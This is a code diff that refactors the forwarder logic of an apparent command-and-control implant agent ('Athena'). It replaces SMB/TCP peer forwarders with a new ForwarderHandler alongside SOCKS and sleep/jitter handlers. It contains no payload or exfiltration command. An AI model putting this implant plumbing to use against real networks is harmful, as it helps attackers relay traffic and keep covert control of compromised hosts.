@@ -15,15 +15,17 @@ using System.Net;
 using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
+using Athena.Handler.Common;
 
 namespace Athena
 {
     public class AthenaClient
     {
         public IProfile profile { get; set; }
-        public IForwarder forwarder { get; set; }
+        //public IForwarder forwarder { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
+        public ForwarderHandler forwarderHandler { get; set; }
         public bool exit { get; set; }
         List<IProfile> availableProfiles { get; set; }
         List<IForwarder> availableForwarders { get; set; }
@@ -31,15 +33,16 @@ namespace Athena
         {
             this.exit = false;
             this.availableProfiles = GetProfiles();
-            this.availableForwarders = GetForwarders();
+            //this.availableForwarders = GetForwarders();
             this.profile = SelectProfile(0);
-            this.forwarder = SelectForwarder(0);
+            //this.forwarder = SelectForwarder(0);
             this.socksHandler = new SocksHandler();
             this.commandHandler = new CommandHandler();
+            this.forwarderHandler = new ForwarderHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
             this.commandHandler.StopForwarder += StopForwarder;
-            this.commandHandler.SetForwarder += SetForwarder;
+            //this.commandHandler.SetForwarder += SetForwarder;
             this.commandHandler.StartSocks += StartSocks;
             this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
@@ -58,10 +61,10 @@ namespace Athena
         /// Select the initial SMB Forwarder
         /// </summary>
         /// <param name="choice">The forwarder to switch to, if null a random one will be selected</param>
-        private IForwarder SelectForwarder(int choice)
-        {
-            return this.availableForwarders[choice];
-        }
+        //private IForwarder SelectForwarder(int choice)
+        //{
+        //    return this.availableForwarders[choice];
+        //}
 
         /// <summary>
         /// Get available C2 Profile Configurations
@@ -133,48 +136,48 @@ profiles.Add("Athena.Profiles.SMB");
         /// <summary>
         /// Get available forwarder Configurations
         /// </summary>
-        private List<IForwarder> GetForwarders()
-        {
-            List<string> profiles = new List<string>();
-            List<IForwarder> forwarders = new List<IForwarder>();
-#if SMBFWD
-            profiles.Add("Athena.Forwarders.SMB");
-#elif TCPFWD
-            profiles.Add("Athena.Forwarders.TCP");
-#else
-            profiles.Add("Athena.Forwarders.Empty");
-#endif
+//        private List<IForwarder> GetForwarders()
+//        {
+//            List<string> profiles = new List<string>();
+//            List<IForwarder> forwarders = new List<IForwarder>();
+//#if SMBFWD || DEBUG
+//            profiles.Add("Athena.Forwarders.SMB");
+//#elif TCPFWD
+//            profiles.Add("Athena.Forwarders.TCP");
+//#else
+//            profiles.Add("Athena.Forwarders.Empty");
+//#endif
 
-#if NATIVEAOT
-            forwarders.Add(profiles.FirstOrDefault().ToUpper(), new Forwarder());
-#else
-            foreach (var profile in profiles)
-            {
-                try
-                {
-                    Assembly fwdAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+//#if NATIVEAOT
+//            forwarders.Add(profiles.FirstOrDefault().ToUpper(), new Forwarder());
+//#else
+//            foreach (var profile in profiles)
+//            {
+//                try
+//                {
+//                    Assembly fwdAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
 
-                    if (fwdAsm == null)
-                    {
-                        continue;
-                    }
-                    foreach (Type t in fwdAsm.GetTypes())
-                    {
-                        if (typeof(IForwarder).IsAssignableFrom(t))
-                        {
-                            Debug.WriteLine($"[{DateTime.Now}] Adding Forwarder: {profile}");
-                            forwarders.Add((IForwarder)Activator.CreateInstance(t));
-                        }
-                    }
-                }
-                catch
-                {
-                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-                }
-            }
-#endif
-            return forwarders;
-        }
+//                    if (fwdAsm == null)
+//                    {
+//                        continue;
+//                    }
+//                    foreach (Type t in fwdAsm.GetTypes())
+//                    {
+//                        if (typeof(IForwarder).IsAssignableFrom(t))
+//                        {
+//                            Debug.WriteLine($"[{DateTime.Now}] Adding Forwarder: {profile}");
+//                            forwarders.Add((IForwarder)Activator.CreateInstance(t));
+//                        }
+//                    }
+//                }
+//                catch
+//                {
+//                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+//                }
+//            }
+//#endif
+//            return forwarders;
+//        }
 
         #region Communication Functions      
         /// <summary>
@@ -340,41 +343,43 @@ profiles.Add("Athena.Profiles.SMB");
         /// </summary>
         /// <param name="sender">Event Sender</param>
         /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
-        private void SetForwarder(object sender, ProfileEventArgs e)
-        {
-            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
-            
-            int choice;
+        //private void SetForwarder(object sender, ProfileEventArgs e)
+        //{
+        //    var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
 
-            var response = new ResponseResult
-            {
-                completed = true,
-                task_id = e.job.task.id,
+        //    int choice;
 
-            };
+        //    var response = new ResponseResult
+        //    {
+        //        completed = true,
+        //        task_id = e.job.task.id,
 
-            if (int.TryParse(profileInfo["profile"], out choice) && !(this.availableForwarders.Count > choice))
-            {
-                this.forwarder = SelectForwarder(choice);
-                response.user_output = $"Updated forwarder to: {this.profile.GetType()}";
-            }
-            else
-            {
-                response.user_output = "Invalid forwarder specified";
-                response.status = "error";
-            }
+        //    };
 
-            TaskResponseHandler.AddResponse(response);
-            return;
-        }
+        //    if (int.TryParse(profileInfo["profile"], out choice) && !(this.availableForwarders.Count > choice))
+        //    {
+        //        this.forwarder = SelectForwarder(choice);
+        //        response.user_output = $"Updated forwarder to: {this.profile.GetType()}";
+        //    }
+        //    else
+        //    {
+        //        response.user_output = "Invalid forwarder specified";
+        //        response.status = "error";
+        //    }
+
+        //    TaskResponseHandler.AddResponse(response);
+        //    return;
+        //}
+
         /// <summary>
         /// EventHandler to start the forwarder
         /// </summary>
         /// <param name="sender">Event Sender</param>
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
-        private void StartForwarder(object sender, TaskEventArgs e)
+        private async void StartForwarder(object sender, TaskEventArgs e)
         {
-            var res = this.forwarder.Link(e.job, this.profile.uuid).Result;
+            //var res = this.forwarder.Link(e.job, this.profile.uuid).Result;
+            var res = await this.forwarderHandler.LinkForwarder(e.job, e.job.task.id);
 
             TaskResponseHandler.AddResponse(new ResponseResult()
             {
@@ -390,7 +395,7 @@ profiles.Add("Athena.Profiles.SMB");
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
         private void StopForwarder(object sender, TaskEventArgs e)
         {
-            this.forwarder.Unlink();
+            //this.forwarder.Unlink();
             TaskResponseHandler.AddResponse(new ResponseResult
             {
                 user_output = "Unlinked from agent",
@@ -489,10 +494,8 @@ profiles.Add("Athena.Profiles.SMB");
         /// <param name="delegates">List of DelegateMessages</param>
         private async Task HandleDelegates(List<DelegateMessage> delegates)
         {
-            Parallel.ForEach(delegates, async del =>
-            {
-                await this.forwarder.ForwardDelegateMessage(del);
-            });
+            Debug.WriteLine($"[{DateTime.Now}] Passing to forwader Handler.");
+            await this.forwarderHandler.HandleDelegateMessages(delegates);
         }
 
         /// <summary>
